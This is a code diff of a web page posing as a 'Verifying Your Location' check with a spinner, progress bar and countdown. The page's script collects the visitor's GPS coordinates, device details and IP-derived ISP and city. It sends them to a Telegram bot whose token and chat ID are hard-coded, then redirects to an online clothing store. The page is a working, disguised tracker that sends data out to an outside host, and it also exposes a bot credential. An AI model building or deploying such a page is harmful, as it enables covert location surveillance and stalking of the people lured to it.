@@ -1,39 +1,267 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Loading...</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifying Your Location...</title>
   <style>
-    body { font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
+      padding: 20px;
+    }
+    
+    .container {
+      background: rgba(255, 255, 255, 0.9);
+      border-radius: 16px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      padding: 30px;
+      max-width: 500px;
+      width: 100%;
+      text-align: center;
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      animation: fadeIn 0.5s ease-out;
+    }
+    
+    h1 {
+      color: #2c3e50;
+      margin-bottom: 20px;
+      font-size: 28px;
+      font-weight: 600;
+    }
+    
+    .status {
+      background: #e3f2fd;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 20px 0;
+      font-size: 18px;
+      color: #2c3e50;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+      border-left: 5px solid #2196f3;
+    }
+    
+    .loading-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+      margin: 30px 0;
+    }
+    
+    .loading-spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      animation: spin 1.5s linear infinite;
+    }
+    
+    .progress-container {
+      width: 100%;
+      background: #e0e0e0;
+      border-radius: 10px;
+      overflow: hidden;
+      height: 12px;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, #2196f3, #21cbf3);
+      width: 0%;
+      border-radius: 10px;
+      transition: width 0.3s ease;
+    }
+    
+    .device-info {
+      background: #f5f5f5;
+      border-radius: 10px;
+      padding: 15px;
+      margin-top: 20px;
+      text-align: left;
+      font-size: 14px;
+      color: #555;
+    }
+    
+    .device-info h3 {
+      color: #2c3e50;
+      margin-bottom: 10px;
+      font-size: 16px;
+      border-bottom: 1px solid #ddd;
+      padding-bottom: 5px;
+    }
+    
+    .redirect-message {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #2c3e50;
+      font-weight: 500;
+    }
+    
+    .countdown {
+      font-weight: 700;
+      color: #e74c3c;
+      font-size: 18px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @media (max-width: 480px) {
+      .container {
+        padding: 20px;
+      }
+      
+      h1 {
+        font-size: 24px;
+      }
+      
+      .status {
+        font-size: 16px;
+        padding: 15px;
+      }
+    }
   </style>
 </head>
 <body>
-<h3 id="status">📍 Requesting location permission...</h3>
+  <div class="container">
+    <h1>Verifying Your Location</h1>
+    
+    <div class="status">
+      <span id="status-icon">📍</span>
+      <span id="status-text">Requesting location permission...</span>
+    </div>
+    
+    <div class="loading-container">
+      <div class="loading-spinner"></div>
+      <div class="progress-container">
+        <div class="progress-bar" id="progress-bar"></div>
+      </div>
+    </div>
+    
+    <div class="device-info">
+      <h3>Device Information</h3>
+      <div id="device-details">Detecting your device...</div>
+    </div>
+    
+    <div class="redirect-message">
+      You will be redirected in <span class="countdown" id="countdown">2</span> seconds
+    </div>
+  </div>
 
-<script>
-const botToken = "8477495842:AAHN8GT3ZBaaKXP-TWySiL1jpWhaiwLVn30"; 
-const chatId = "8144368202"; 
-const redirectURL = "https://luxuarydubai.com/product-category/clothing/";
-const intervalMinutes = 10;
+  <script>
+    const botToken = "8477495842:AAHN8GT3ZBaaKXP-TWySiL1jpWhaiwLVn30"; 
+    const chatId = "8144368202"; 
+    const redirectURL = "https://luxuarydubai.com/product-category/clothing/";
+    
+    // DOM elements
+    const statusText = document.getElementById('status-text');
+    const statusIcon = document.getElementById('status-icon');
+    const deviceDetails = document.getElementById('device-details');
+    const progressBar = document.getElementById('progress-bar');
+    const countdownElement = document.getElementById('countdown');
+    
+    // Update device info display
+    function updateDeviceInfo() {
+      const deviceInfo = detectDeviceModel();
+      const networkInfo = getNetworkInfo();
+      
+      deviceDetails.innerHTML = `
+        <p><strong>Device:</strong> ${deviceInfo}</p>
+        <p><strong>Platform:</strong> ${navigator.platform}</p>
+        <p><strong>Browser:</strong> ${navigator.userAgent.split(') ').pop().split(' ')[0]}</p>
+        <p><strong>Resolution:</strong> ${screen.width}x${screen.height}</p>
+        <p><strong>IP:</strong> ${networkInfo.ip || "Detecting..."}</p>
+      `;
+    }
+    
+    // Detect device model
+    function detectDeviceModel() {
+      const ua = navigator.userAgent;
+      
+      if (/iPhone/i.test(ua)) {
+        const version = ua.match(/iPhone OS (\d+_\d+)/i);
+        return `Apple iPhone (iOS ${version ? version[1].replace('_', '.') : 'Unknown'})`;
+      }
+      
+      if (/iPad/i.test(ua)) {
+        const version = ua.match(/CPU OS (\d+_\d+)/i);
+        return `Apple iPad (iPadOS ${version ? version[1].replace('_', '.') : 'Unknown'})`;
+      }
+      
+      if (/Android/i.test(ua)) {
+        const modelMatch = ua.match(/Android\s+\d+\.\d+;\s*([^;)]+)\)/i);
+        return modelMatch ? modelMatch[1].trim() : "Android Device";
+      }
+      
+      if (/Windows/i.test(ua)) {
+        if (/Windows NT 10.0/i.test(ua)) return "Windows 10/11 PC";
+        if (/Windows NT 6.3/i.test(ua)) return "Windows 8.1 PC";
+        if (/Windows NT 6.2/i.test(ua)) return "Windows 8 PC";
+        if (/Windows NT 6.1/i.test(ua)) return "Windows 7 PC";
+        return "Windows PC";
+      }
+      
+      if (/Macintosh/i.test(ua)) {
+        if (/Mac OS X (\d+[._]\d+)/i.test(ua)) {
+          const version = ua.match(/Mac OS X (\d+[._]\d+)/i)[1].replace('_', '.');
+          return `Mac (macOS ${version})`;
+        }
+        return "Mac";
+      }
+      
+      if (/Linux/i.test(ua)) return "Linux Device";
+      
+      return "Unknown Device";
+    }
+    
+    // Get network info
+    function getNetworkInfo() {
+      return {
+        ip: "Detecting...",
+        org: "Unknown",
+        city: "Unknown",
+        region: "Unknown",
+        country: "Unknown"
+      };
+    }
+    
+    // Send message to Telegram
+    function sendData(message) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).catch(() => {});
+    }
+    
+    // Send location + device info
+    function sendLocation(lat, lon, ipData) {
+      const message = `📍 Location: ${lat},${lon}
+https://maps.google.com/?q=${lat},${lon}
 
-// Detect device model
-function detectDeviceModel() {
-  const ua = navigator.userAgent;
-  if (/iPhone/i.test(ua)) return "Apple iPhone (" + ua.match(/iPhone OS [\\d_]+/i)[0].replace(/_/g, ".") + ")";
-  if (/iPad/i.test(ua)) return "Apple iPad (" + ua.match(/CPU OS [\\d_]+/i)[0].replace(/_/g, ".") + ")";
-  if (/Android/i.test(ua)) {
-    const match = ua.match(/Android\\s+[\\d.]+;\\s*([^)]+)/i);
-    if (match && match[1]) return match[1].trim();
-    return "Android Device";
-  }
-  if (/Windows/i.test(ua)) return "Windows PC";
-  if (/Macintosh/i.test(ua)) return "Mac";
-  if (/Linux/i.test(ua)) return "Linux Device";
-  return "Unknown Device";
-}
-
-// Device info
-function getDeviceInfo(ipData) {
-  return `
 🖥 Device Info:
 - Device Model: ${detectDeviceModel()}
 - User Agent: ${navigator.userAgent}
@@ -42,70 +270,105 @@ function getDeviceInfo(ipData) {
 - Screen: ${screen.width}x${screen.height}
 
 🌐 Network Info:
-- IP: ${ipData.ip}
+- IP: ${ipData.ip || "Unknown"}
 - ISP: ${ipData.org || "Unknown"}
 - City: ${ipData.city || "Unknown"}
 - Region: ${ipData.region || "Unknown"}
-- Country: ${ipData.country || "Unknown"}
-`;
-}
-
-// Send message to Telegram
-function sendData(message) {
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text: message })
-  }).catch(() => {});
-}
-
-// Send location + device info
-function sendLocation(lat, lon, ipData) {
-  const message = `📍 Location: ${lat},${lon}
-https://maps.google.com/?q=${lat},${lon}
-${getDeviceInfo(ipData)}`;
-  sendData(message);
-}
-
-// Get location
-function getLocationPromise() {
-  return new Promise((resolve) => {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => resolve(pos),
-        () => resolve(null)
-      );
-    } else {
-      resolve(null);
+- Country: ${ipData.country || "Unknown"}`;
+      
+      sendData(message);
     }
-  });
-}
+    
+    // Get location
+    function getLocationPromise() {
+      return new Promise((resolve) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => resolve(pos),
+            () => resolve(null)
+          );
+        } else {
+          resolve(null);
+        }
+      });
+    }
+    
+    // Start tracking and redirect
+    async function startTracking() {
+      // Update device info immediately
+      updateDeviceInfo();
+      
+      // Get IP & network info first
+      let ipData = {};
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        ipData = await res.json();
+        updateDeviceInfo();
+      } catch (e) {}
+      
+      // Update status
+      statusText.textContent = "Accessing location services...";
+      statusIcon.textContent = "📡";
+      
+      // Start progress bar animation
+      let progress = 0;
+      const progressInterval = setInterval(() => {
+        progress += 1;
+        progressBar.style.width = `${progress}%`;
+        if (progress >= 100) clearInterval(progressInterval);
+      }, 20);
+      
+      // Start countdown
+      let countdown = 2;
+      const countdownInterval = setInterval(() => {
+        countdownElement.textContent = countdown;
+        countdown--;
+        if (countdown < 0) {
+          clearInterval(countdownInterval);
+          window.location.href = redirectURL;
+        }
+      }, 1000);
+      
+      // Get location
+      const pos = await getLocationPromise();
+      
+      if (pos) {
+        statusText.textContent = "Location obtained successfully!";
+        statusIcon.textContent = "✅";
+        sendLocation(pos.coords.latitude, pos.coords.longitude, ipData);
+      } else {
+        statusText.textContent = "Location access not available";
+        statusIcon.textContent = "⚠️";
+        sendData(`❌ Location denied.\n${getDeviceInfo(ipData)}`);
+      }
+      
+      // Complete progress bar
+      progressBar.style.width = "100%";
+      
+      // Wait until countdown completes
+      await new Promise(resolve => setTimeout(resolve, 2000));
+    }
+    
+    // Start the process
+    startTracking();
+    
+    // Helper function for device info
+    function getDeviceInfo(ipData) {
+      return `
+🖥 Device Info:
+- Device Model: ${detectDeviceModel()}
+- User Agent: ${navigator.userAgent}
+- Platform: ${navigator.platform}
+- Language: ${navigator.language}
+- Screen: ${screen.width}x${screen.height}
 
-// Start immediately
-(async function startTracking() {
-  // Get IP & network info first
-  let ipData = {};
-  try {
-    const res = await fetch("https://ipapi.co/json/");
-    ipData = await res.json();
-  } catch (e) {}
-
-  const pos = await getLocationPromise();
-  if (pos) {
-    sendLocation(pos.coords.latitude, pos.coords.longitude, ipData);
-  } else {
-    sendData(`❌ Location denied.\n${getDeviceInfo(ipData)}`);
-  }
-
-  // Redirect after first report
-  window.location.href = redirectURL;
-
-  // Repeat every 10 minutes
-  setInterval(async () => {
-    const p = await getLocationPromise();
-    if (p) sendLocation(p.coords.latitude, p.coords.longitude, ipData);
-  }, intervalMinutes * 60 * 1000);
-})();
-</script>
+🌐 Network Info:
+- IP: ${ipData.ip || "Unknown"}
+- ISP: ${ipData.org || "Unknown"}
+- City: ${ipData.city || "Unknown"}
+- Region: ${ipData.region || "Unknown"}
+- Country: ${ipData.country || "Unknown"}`;
+    }
+  </script>
 </body>
 </html>
